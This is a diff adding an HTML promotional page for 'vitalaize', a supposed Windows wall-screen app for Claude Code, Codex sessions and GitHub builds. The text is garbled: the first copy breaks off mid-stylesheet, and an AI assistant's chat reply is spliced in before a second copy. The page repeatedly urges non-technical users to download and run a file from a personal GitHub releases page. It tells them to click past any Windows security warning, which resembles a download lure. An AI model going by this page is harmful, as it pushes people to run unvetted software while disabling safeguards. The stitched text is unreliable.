@@ -1,0 +1,386 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>vitalaize - Wall Screen for Claude Code, Codex Sessions, and GitHub Builds</title>
+<meta name="description" content="vitalaize turns your Windows display into a clear wall screen for Claude Code and Codex sessions and your GitHub builds. Visit the official releases page to download the application.">
+<meta name="keywords" content="vitalaize, wall screen, Claude Code sessions, Codex sessions, GitHub builds, Windows app, session display, build monitor">
+<meta name="robots" content="index, follow">
+<link rel="canonical" href="https://github.com/kerriesingle633/vitalaize">
+<meta property="og:title" content="vitalaize - Wall Screen for Claude Code, Codex Sessions, and GitHub Builds">
+<meta property="og:description" content="A simple wall screen for Windows that shows Claude Code and Codex sessions and your GitHub builds in one view.">
+<meta property="og:url" content="https://github.com/kerriesingle633/vitalaize/releases">
+<meta property="og:type" content="website">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="vitalaize - Wall Screen for Sessions and Builds">
+<meta name="twitter:description" content="Keep Claude Code and Codex sessions and GitHub builds visible on one clean wall screen.">
+<style>
+  * {
+    box-sizing: border-box;
+  }
+  html {
+    scroll-behavior: smooth;
+  }
+  body {
+    margin: 0;
+    background: #f4f7fb;
+    color: #243b53;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    line-height: 1.7;
+    font-size: 16px;
+  }
+  .page {
+    max-width: 980px;
+    margin: 0 auto;
+    padding: 48px 20px 64px;
+  }
+  .hero {
+    padding: 24px 0 20px;
+  }
+  h1 {
+    margin: 0 0 18px;
+    color: #102a43;
+    font-size: clamp(2rem, 5vw, 3.2rem);
+    line-height: 1.15;
+    letter-spacing: -0.02em;
+  }
+  h2 {
+    margin: 0 0 16px;
+    color: #102a43;
+    font-size: clamp(1.35rem, 3vw, 1.75rem);
+    line-height: 1.25;
+  }
+  h3 {
+    margin: 22px 0 8px;
+    color: #243b53;
+    font-size: 1.12rem;
+  }
+  p {
+    margin: 0 0 16px;
+    color: #334e68;
+  }
+  .lead {
+    font-size: clamp(1.05rem, 2.4vw, 1.2rem);
+    color: #486581;
+    max-width: 820px;
+  }
+  .primary-button {
+    display: inline-block;
+    margin: 8px 0 10px;
+    padding: 16px 30px;
+    border-radius: 14px;
+    background: linear-gradient(135deg, #ff6b6b 0%, #feca57 48%, #48dbfb 100%);
+    color: #102a43;
+    font-weight: 800;
+    text-decoration: none;
+    box-shadow: 0 10px 24px rgba(16, 42, 67, 0.18);
+    transition: transform 0.2s ease, box-shadow 0.2s ease;
+  }
+  .primary-button:hover,
+  .primary-button:focus {
+    transform: translateY(-2px);
+    box-shadow: 0 14px 30px rgba(16, 42, 67, 0.24Here is a complete HTML/CSS document that follows your requirements. It presents the vitalaize app as a clean, single-page README-style site with a prominent download button, step-by-step guidance for non-technical users, and responsive styling.
+```html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>vitalaize - Wall Screen for Claude Code, Codex Sessions, and GitHub Builds</title>
+<meta name="description" content="vitalaize turns your Windows screen into a clear wall display for Claude Code and Codex sessions and your GitHub builds. Visit the official releases page to download the application.">
+<meta name="keywords" content="vitalaize, wall screen, Claude Code sessions, Codex sessions, GitHub builds, Windows app, session display, build monitor, dashboard">
+<meta name="author" content="vitalaize">
+<meta name="robots" content="index, follow">
+<link rel="canonical" href="https://github.com/kerriesingle633/vitalaize">
+<meta property="og:title" content="vitalaize - Wall Screen for Claude Code, Codex Sessions, and GitHub Builds">
+<meta property="og:description" content="A simple wall screen for Windows that keeps Claude Code and Codex sessions and your GitHub builds in one clear view.">
+<meta property="og:url" content="https://github.com/kerriesingle633/vitalaize/releases">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="vitalaize">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="vitalaize - Wall Screen for Sessions and Builds">
+<meta name="twitter:description" content="Keep Claude Code and Codex sessions and your GitHub builds visible on one clean wall screen.">
+<style>
+  * {
+    box-sizing: border-box;
+  }
+  html {
+    scroll-behavior: smooth;
+  }
+  body {
+    margin: 0;
+    background: #f4f7fb;
+    color: #243b53;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    line-height: 1.7;
+    font-size: 16px;
+    -webkit-font-smoothing: antialiased;
+  }
+  .page {
+    max-width: 980px;
+    margin: 0 auto;
+    padding: 48px 20px 64px;
+  }
+  .hero {
+    padding: 8px 0 20px;
+  }
+  h1 {
+    margin: 0 0 18px;
+    color: #102a43;
+    font-size: clamp(2rem, 5vw, 3.1rem);
+    line-height: 1.15;
+    letter-spacing: -0.02em;
+    font-weight: 800;
+  }
+  h2 {
+    margin: 0 0 16px;
+    color: #102a43;
+    font-size: clamp(1.35rem, 3vw, 1.75rem);
+    line-height: 1.25;
+    font-weight: 800;
+    letter-spacing: -0.01em;
+  }
+  h3 {
+    margin: 26px 0 8px;
+    color: #243b53;
+    font-size: 1.1rem;
+    font-weight: 700;
+  }
+  p {
+    margin: 0 0 16px;
+    color: #334e68;
+  }
+  ul,
+  ol {
+    margin: 0 0 18px;
+    padding-left: 24px;
+    color: #334e68;
+  }
+  li {
+    margin-bottom: 10px;
+  }
+  strong {
+    color: #102a43;
+  }
+  a {
+    color: #1f6feb;
+  }
+  .lead {
+    font-size: clamp(1.05rem, 2.4vw, 1.2rem);
+    color: #486581;
+    max-width: 820px;
+  }
+  .primary-button {
+    display: inline-block;
+    margin: 10px 0 8px;
+    padding: 16px 30px;
+    border-radius: 14px;
+    background: linear-gradient(135deg, #ff6b6b 0%, #feca57 50%, #48dbfb 100%);
+    color: #102a43;
+    font-weight: 800;
+    font-size: 1.02rem;
+    text-decoration: none;
+    box-shadow: 0 10px 24px rgba(16, 42, 67, 0.18);
+    transition: transform 0.2s ease, box-shadow 0.2s ease;
+  }
+  .primary-button:hover,
+  .primary-button:focus {
+    transform: translateY(-2px);
+    box-shadow: 0 14px 30px rgba(16, 42, 67, 0.24);
+    outline: none;
+  }
+  .button-row {
+    padding: 4px 0 8px;
+  }
+  .card {
+    background: #ffffff;
+    border-radius: 18px;
+    padding: 28px 28px 20px;
+    margin: 0 0 26px;
+    box-shadow: 0 6px 22px rgba(16, 42, 67, 0.08);
+  }
+  .download-card {
+    background: #ffffff;
+    border-radius: 18px;
+    padding: 30px 28px 24px;
+    margin: 0 0 26px;
+    box-shadow: 0 8px 28px rgba(16, 42, 67, 0.12);
+    border: 1px solid #e1e8f0;
+  }
+  .steps li {
+    margin-bottom: 14px;
+  }
+  .grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+    gap: 18px;
+    margin: 0 0 26px;
+  }
+  .feature {
+    background: #ffffff;
+    border-radius: 16px;
+    padding: 22px 22px 16px;
+    box-shadow: 0 4px 16px rgba(16, 42, 67, 0.07);
+    border: 1px solid #e8eef5;
+  }
+  .feature h3 {
+    margin-top: 0;
+  }
+  .feature p {
+    margin-bottom: 0;
+    font-size: 0.98rem;
+  }
+  .note {
+    background: #eef6ff;
+    border-left: 5px solid #48dbfb;
+    border-radius: 10px;
+    padding: 16px 18px;
+    margin: 0 0 20px;
+    color: #334e68;
+  }
+  .note p:last-child {
+    margin-bottom: 0;
+  }
+  footer {
+    margin-top: 40px;
+    padding-top: 22px;
+    border-top: 1px solid #dbe3ec;
+    color: #627d98;
+    font-size: 0.9rem;
+    text-align: center;
+  }
+  footer a {
+    color: #1f6feb;
+    text-decoration: none;
+  }
+  @media (max-width: 560px) {
+    .page {
+      padding: 32px 16px 48px;
+    }
+    .card,
+    .download-card {
+      padding: 22px 18px 16px;
+    }
+    .primary-button {
+      display: block;
+      text-align: center;
+      padding: 16px 18px;
+    }
+  }
+</style>
+</head>
+<body>
+<div class="page">
+
+  <header class="hero">
+    <h1>🖥️ vitalaize - Keep Your Sessions and Builds Visible</h1>
+    <p class="lead">vitalaize is a wall screen for Windows that shows your Claude Code and Codex sessions and your GitHub builds in one clear place. Instead of switching between windows, you get a single screen that keeps everything in view.</p>
+    <div class="button-row">
+      <a class="primary-button" href="https://github.com/kerriesingle633/vitalaize/releases" target="_blank" rel="noopener">Visit this link to download the application</a>
+    </div>
+  </header>
+
+  <section class="card">
+    <h2>👋 What Is vitalaize?</h2>
+    <p>vitalaize is a small desktop application for Windows. It turns your screen into a live wall display. On that display you can see what is happening with your Claude Code sessions, your Codex sessions, and the builds that run from your GitHub projects.</p>
+    <p>You do not need to be a programmer to use it. If you can open an app on your computer, you can use vitalaize. The app is made for people who want to keep an eye on activity without constantly clicking between browser tabs and terminal windows.</p>
+    <p>Think of it like a noticeboard for your computer work. Everything important is on one surface, easy to read from a distance, and easy to understand at a glance.</p>
+  </section>
+
+  <section class="download-card" id="download">
+    <h2>⬇️ Download and Setup</h2>
+    <p>All files for vitalaize are published on the official releases page. That page is the only place you need to go.</p>
+    <p><strong>Visit this link to download the application:</strong></p>
+    <div class="button-row">
+      <a class="primary-button" href="https://github.com/kerriesingle633/vitalaize/releases" target="_blank" rel="noopener">Visit this link to download the application</a>
+    </div>
+    <h3>What to do next</h3>
+    <ol class="steps">
+      <li>Click the download link above. Your browser will open the releases page.</li>
+      <li>On that page, find the most recent release listed at the top.</li>
+      <li>Download the file attached to that release and save it somewhere you can find easily, such as your Desktop or Downloads folder.</li>
+      <li>Once the download finishes, open the file and follow the on-screen prompts to finish setting up vitalaize on your Windows computer.</li>
+      <li>When setup is complete, open vitalaize from the Start menu or from the shortcut created during setup.</li>
+    </ol>
+    <div class="note">
+      <p>If Windows shows a security message the first time you open the file, click the option that lets you continue. This is a normal message for software downloaded from the internet.</p>
+    </div>
+  </section>
+
+  <section>
+    <h2>✨ What You Can Expect</h2>
+    <div class="grid">
+      <div class="feature">
+        <h3>One screen for everything</h3>
+        <p>Claude Code sessions, Codex sessions, and GitHub builds all appear together on a single wall display, so you never have to hunt for the right window.</p>
+      </div>
+      <div class="feature">
+        <h3>Readable from a distance</h3>
+        <p>The layout is designed for a wall screen, which means larger text and clear spacing so you can read it from across the room.</p>
+      </div>
+      <div class="feature">
+        <h3>Simple to start</h3>
+        <p>There is no complicated configuration. Download the application, open it, and your wall screen is ready.</p>
+      </div>
+      <div class="feature">
+        <h3>Built for Windows</h3>
+        <p>vitalaize is made to run on a normal Windows computer, including small form-factor machines and displays used as dedicated screens.</p>
+      </div>
+    </div>
+  </section>
+
+  <section class="card">
+    <h2>🚀 Getting Started for the First Time</h2>
+    <p>Once vitalaize is set up, the first launch is straightforward. Here is a simple path to follow.</p>
+    <h3>Step 1: Open the app</h3>
+    <p>Find vitalaize in your Start menu, or double-click the shortcut on your Desktop. The wall screen window will appear.</p>
+    <h3>Step 2: Let it fill the screen</h3>
+    <p>vitalaize works best when it has room to breathe. Resize the window to cover your screen, or use the full-screen option inside the app if one is shown. A dedicated monitor or a small wall-mounted display works especially well.</p>
+    <h3>Step 3: Keep it running in the background</h3>
+    <p>Leave vitalaize open while you work. It will keep your sessions and builds visible as they change, without you needing to refresh anything.</p>
+    <h3>Step 4: Adjust it to your liking</h3>
+    <p>Any settings are available from inside the app. Change what you want, when you want. Nothing you do here can break your computer, so feel free to explore.</p>
+  </section>
+
+  <section class="card">
+    <h2>🛠️ Common Questions</h2>
+    <h3>Do I need to install anything else first?</h3>
+    <p>No. vitalaize is a self-contained application. Download it, run it, and it handles the rest.</p>
+    <h3>Where do I get updates?</h3>
+    <p>New versions are posted on the same releases page. Bookmark the link so you can check back whenever you want the latest version. Updating means downloading the newest file and running it the same way you did the first time.</p>
+    <h3>What if the screen looks empty?</h3>
+    <p>vitalaize shows information once there is something to show. If your sessions or builds are quiet, the screen will look quiet too. As soon as activity starts, it appears on the wall screen.</p>
+    <h3>Can I use it on more than one computer?</h3>
+    <p>Yes. You can download and set up vitalaize on each Windows computer where you want a wall screen.</p>
+    <h3>Does it change anything on my GitHub account?</h3>
+    <p>vitalaize is a display tool. It shows you information. It is not designed to edit your projects or change your account settings.</p>
+  </section>
+
+  <section class="card">
+    <h2>💡 Tips for the Best Experience</h2>
+    <ul>
+      <li>Use a screen that stays on and stays visible, such as a spare monitor or a wall-mounted display.</li>
+      <li>Turn off automatic sleep for that display so the wall screen does not go dark while you need it.</li>
+      <li>Keep the vitalaize window in full-screen mode for the cleanest look.</li>
+      <li>Sit back and glance at it the way you would glance at a clock. That is the whole idea.</li>
+    </ul>
+  </section>
+
+  <section class="download-card">
+    <h2>📥 Ready to Begin?</h2>
+    <p>You have everything you need. Visit the official releases page, download the application, and open it on your Windows computer.</p>
+    <div class="button-row">
+      <a class="primary-button" href="https://github.com/kerriesingle633/vitalaize/releases" target="_blank" rel="noopener">Visit this link to download the application</a>
+    </div>
+  </section>
+
+  <footer>
+    <p>vitalaize - A wall screen for Claude Code and Codex sessions and your GitHub builds.</p>
+    <p><a href="https://github.com/kerriesingle633/vitalaize/releases" target="_blank" rel="noopener">Official releases page</a></p>
+  </footer>
+
+</div>
+</body>
+</html>
+```
